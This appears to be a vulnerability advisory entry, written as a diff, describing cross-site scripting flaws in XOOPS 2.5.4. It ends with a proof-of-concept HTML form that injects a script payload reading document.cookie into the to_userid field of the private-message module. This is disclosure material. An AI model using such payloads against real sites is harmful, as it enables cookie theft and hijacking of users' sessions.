@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/53143/info
+
+XOOPS is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+XOOPS 2.5.4 is vulnerable; other versions may be affected. 
+
+<form action='http://www.example.com/modules/pm/pmlite.php' method="post">
+<input type="hidden" name="sendmod" value='1'>
+<input type="hidden" name="to_userid" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn">
+</form>
